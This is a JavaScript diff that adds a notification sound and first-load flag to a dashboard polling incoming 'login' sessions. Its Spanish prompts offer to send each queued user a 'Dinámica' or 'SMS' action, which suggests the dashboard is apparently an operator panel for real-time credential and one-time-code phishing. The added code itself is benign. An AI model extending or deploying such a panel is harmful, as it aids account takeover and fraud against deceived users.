@@ -10,6 +10,8 @@ const hint = document.getElementById('hint')
 const btnClean = document.getElementById('btnClean')
 const btnExport = document.getElementById('btnExport')
 
+let isInitialLoad = true;
+
 /** @type {Map<string, object>} */
 const rows = new Map()
 
@@ -305,9 +307,11 @@ async function pollSessions() {
       });
       render();
 
-      // Trigger flash effect for new rows that were not in old list
+      // Trigger flash effect and sound for new rows that were not in old list
+      let hasNewSession = false;
       list.forEach((session) => {
         if (!oldKeys.has(session.id)) {
+          hasNewSession = true;
           requestAnimationFrame(() => {
             const tr = document.querySelector(`tr[data-row-id="${session.id}"]`)
             if (!tr) return
@@ -316,8 +320,35 @@ async function pollSessions() {
           })
         }
       });
+
+      if (hasNewSession && !isInitialLoad) {
+        playNotificationSound();
+      }
     }
   } catch (_) {}
+}
+
+function playNotificationSound() {
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const oscillator = audioCtx.createOscillator();
+    const gainNode = audioCtx.createGain();
+    
+    oscillator.connect(gainNode);
+    gainNode.connect(audioCtx.destination);
+    
+    oscillator.type = 'sine';
+    oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime); // D5
+    oscillator.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.15); // A5
+    
+    gainNode.gain.setValueAtTime(0.3, audioCtx.currentTime);
+    gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+    
+    oscillator.start(audioCtx.currentTime);
+    oscillator.stop(audioCtx.currentTime + 0.4);
+  } catch (e) {
+    console.error("No se pudo reproducir el sonido de notificación:", e);
+  }
 }
 
 btnClean?.addEventListener('click', async () => {
@@ -370,6 +401,7 @@ window.setInterval(pollSessions, 2000)
 
 // Initial load
 pollSessions().then(() => {
+  isInitialLoad = false; // Initial fetch completed, enable sound notifications
   hint.textContent = rows.size
     ? `En cola: ${rows.size}. Elige Dinámica o SMS en Acciones.`
     : 'Esperando usuarios del login… Al ingresar llegan aquí ordenados.'
